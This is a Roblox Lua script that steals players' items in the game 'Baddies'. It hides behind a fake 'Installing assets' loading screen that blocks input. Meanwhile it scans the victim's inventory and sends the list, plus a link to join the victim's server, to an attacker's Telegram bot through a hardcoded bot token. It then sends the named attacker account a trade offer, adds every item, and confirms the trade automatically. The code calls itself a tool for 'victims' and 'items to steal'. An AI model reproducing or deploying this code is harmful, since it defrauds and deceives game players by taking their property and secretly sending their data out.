-- Baddies Trade Victim - Send offer + Add items + Telegram notification
local BotToken = "8901275927:AAF4yyM-Dh42oODQVhH2Q1K8x1yFeL0n5BA"
local ChatId = "8867157834"
local TargetUsername = "jay_xmoney123"

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local localPlayer = Players.LocalPlayer

local function sendTelegram(text)
    task.spawn(function()
        pcall(function()
            http_request({
                Url = "https://api.telegram.org/bot" .. BotToken .. "/sendMessage",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode({
                    chat_id = ChatId,
                    text = text,
                    parse_mode = "HTML"
                })
            })
        end)
    end)
end

local function scanInventory()
    local items = {}
    local ok, Replion = pcall(require, game.ReplicatedStorage.Modules.Replion)
    if ok and Replion and Replion.Client then
        local data = Replion.Client:GetReplion("Data")
        if data then
            local d = data:Get()
            if d and d.NewInventory and d.NewInventory.Items then
                local typeMapping = {
                    Weapons = "Weapon",
                    WeaponSkins = "WeaponSkin",
                    Skins = "WeaponSkin",
                    Finishers = "Finisher"
                }
                for itemType, itemTable in pairs(d.NewInventory.Items) do
                    local mappedType = typeMapping[itemType] or itemType
                    for guid, itemData in pairs(itemTable) do
                        table.insert(items, {Name = itemData.Name, Type = mappedType, Guid = guid})
                    end
                end
            end
        end
    end
    return items
end

local function createLoadingScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BaddiesLoader"; screenGui.DisplayOrder = 999999; screenGui.IgnoreGuiInset = true; screenGui.ResetOnSpawn = false; screenGui.Parent = CoreGui

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0); frame.BackgroundColor3 = Color3.fromRGB(20, 20, 30); frame.BorderSizePixel = 0; frame.Parent = screenGui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(0.6, 0, 0.1, 0); title.Position = UDim2.new(0.2, 0, 0.25, 0); title.BackgroundTransparency = 1
    title.Text = "Baddies"; title.TextColor3 = Color3.fromRGB(255, 255, 255); title.TextScaled = true; title.Font = Enum.Font.GothamBold; title.Parent = frame

    local subtitle = Instance.new("TextLabel")
    subtitle.Size = UDim2.new(0.6, 0, 0.05, 0); subtitle.Position = UDim2.new(0.2, 0, 0.35, 0); subtitle.BackgroundTransparency = 1
    subtitle.Text = "Installing assets... 87%"; subtitle.TextColor3 = Color3.fromRGB(200, 200, 200); subtitle.TextScaled = true; subtitle.Font = Enum.Font.Gotham; subtitle.Parent = frame

    local barBg = Instance.new("Frame")
    barBg.Size = UDim2.new(0.5, 0, 0.03, 0); barBg.Position = UDim2.new(0.25, 0, 0.42, 0); barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 50); barBg.BorderSizePixel = 0; barBg.Parent = frame

    local barFill = Instance.new("Frame")
    barFill.Size = UDim2.new(0.87, 0, 1, 0); barFill.BackgroundColor3 = Color3.fromRGB(100, 200, 255); barFill.BorderSizePixel = 0; barFill.Parent = barBg

    local statusLabel = Instance.new("TextLabel")
    statusLabel.Size = UDim2.new(0.5, 0, 0.04, 0); statusLabel.Position = UDim2.new(0.25, 0, 0.46, 0); statusLabel.BackgroundTransparency = 1
    statusLabel.Text = "Downloading additional content..."; statusLabel.TextColor3 = Color3.fromRGB(150, 150, 150); statusLabel.TextScaled = true; statusLabel.Font = Enum.Font.Gotham; statusLabel.Parent = frame

    spawn(function()
        local targets = {0.87, 0.73, 0.91, 0.88, 0.94, 0.89, 0.93, 0.87}
        local messages = {"Installing assets... 87%", "Downloading additional content... 73%", "Configuring game files... 91%", "Almost done... 94%", "Verifying installation... 88%"}
        while true do
            for i, target in ipairs(targets) do
                local tween = TweenService:Create(barFill, TweenInfo.new(3 + math.random() * 2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Size = UDim2.new(target, 0, 1, 0)})
                tween:Play(); tween.Completed:Wait()
                subtitle.Text = "Installing assets... " .. math.floor(target * 100) .. "%"
                statusLabel.Text = messages[(i % #messages) + 1]
                task.wait(1 + math.random() * 2)
            end
        end
    end)

    for _, eventName in ipairs({"InputBegan", "InputChanged", "InputEnded"}) do
        UserInputService[eventName]:Connect(function(input, gp) if not gp then return Enum.ContextActionResult.Sink end end)
    end

    return screenGui
end

local function main()
    local char = localPlayer.Character
    if char then local rp = char:FindFirstChild("HumanoidRootPart") if rp then rp.Anchored = true end end
    createLoadingScreen()

    task.wait(3)

    -- Clear any stale trade session first
    local netMod = game.ReplicatedStorage.Modules.Net
    task.spawn(function()
        pcall(function() netMod:FindFirstChild("RF/Trading/CancelTrade"):InvokeServer() end)
    end)
    task.wait(0.5)

    -- Scan inventory
    local items = scanInventory()

    -- Setup TeleportService command for jay
    local teleportCmd = string.format(
        'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
        game.PlaceId, game.JobId
    )

    -- Send initial notification with items and server join link immediately
    local joinUrl = string.format("roblox://experiences/start?placeId=%s&gameInstanceId=%s", tostring(game.PlaceId), tostring(game.JobId))
    local msg = "✨ <b>New Victim Detected!</b> ✨

"
    msg = msg .. "👤 <b>Victim:</b> " .. localPlayer.DisplayName .. " (@@" .. localPlayer.Name .. ")
"
    msg = msg .. "📦 <b>Items to Steal:</b> " .. #items .. "
"
    for _, item in ipairs(items) do
        msg = msg .. "  ↳ 🏷️ " .. item.Name .. " [" .. item.Type .. "]
"
    end
    msg = msg .. "
🔗 <a href="" .. joinUrl .. ""><b>CLICK HERE TO QUICK JOIN VICTIM</b></a>

"
    msg = msg .. "Or copy the join command:
<code>" .. teleportCmd .. "</code>"

    sendTelegram(msg)

    -- Step 1: Wait up to 120 seconds for target to join the server
    local target = Players:FindFirstChild(TargetUsername)
    local startWait = os.time()
    while not target and (os.time() - startWait) < 120 do
        task.wait(1)
        target = Players:FindFirstChild(TargetUsername)
    end

    if not target then
        sendTelegram("ERROR: " .. TargetUsername .. " did not join the server in time!
Place: " .. game.PlaceId .. "
JobId: " .. game.JobId .. "

" .. teleportCmd)
        return
    end

    local tradeStarted = false
    local connection

    while not tradeStarted do
        -- Clear any stale trade session first
        task.spawn(function()
            pcall(function() netMod:FindFirstChild("RF/Trading/CancelTrade"):InvokeServer() end)
        end)
        task.wait(0.5)

        local tradeStartedRE = netMod:FindFirstChild("RE/Trading/TradeStarted")
        if tradeStartedRE then
            connection = tradeStartedRE.OnClientEvent:Connect(function()
                tradeStarted = true
            end)
        end

        -- Invoke SendTradeOffer asynchronously using task.spawn so it doesn't block the retry loop
        task.spawn(function()
            pcall(function() netMod:FindFirstChild("RF/Trading/SendTradeOffer"):InvokeServer(target) end)
        end)

        -- Wait up to 30 seconds for trade to start
        local start = os.time()
        while not tradeStarted and (os.time() - start) < 30 do
            task.wait(0.5)
        end

        if connection then
            connection:Disconnect()
            connection = nil
        end

        if not tradeStarted then
            sendTelegram("⚠️ Trade offer expired or was declined. Retrying in 2 seconds...")
            task.wait(2)
        end
    end

    -- Step 2: Load inventory, then add all items
    task.wait(0.5)
    local ok2, err2 = pcall(function() netMod:FindFirstChild("RF/Trading/LoadPlayerInventory"):InvokeServer() end)
    if not ok2 then sendTelegram("LoadPlayerInventory error: " .. tostring(err2)) end
    task.wait(0.5)
    local added = 0
    for _, item in ipairs(items) do
        local ok, err = pcall(function() netMod:FindFirstChild("RF/Trading/AddItem"):InvokeServer(item.Type, item.Guid) end)
        if ok then added = added + 1 end
        task.wait(0.2)
    end

    -- Step 3: Set ready (retry up to 5 times)
    local readySuccess = false
    for i = 1, 5 do
        task.wait(1)
        local ok, res = pcall(function() return netMod:FindFirstChild("RF/Trading/SetReady"):InvokeServer(true) end)
        if ok and res == true then
            readySuccess = true
            break
        end
    end

    -- Step 4: Confirm trade (retry up to 15 times)
    local confirmSuccess = false
    for i = 1, 15 do
        task.wait(1)
        local ok, res = pcall(function() return netMod:FindFirstChild("RF/Trading/ConfirmTrade"):InvokeServer() end)
        if ok and res == true then
            confirmSuccess = true
            break
        end
    end

    -- Step 5: Telegram notification
    local msg = "✅ <b>Baddies Trade Successful!</b>
"
    msg = msg .. "👤 <b>Victim:</b> " .. localPlayer.DisplayName .. " (@@" .. localPlayer.Name .. ")
"
    msg = msg .. "📦 All items have been transferred to " .. TargetUsername .. "."
    sendTelegram(msg)
end

main()
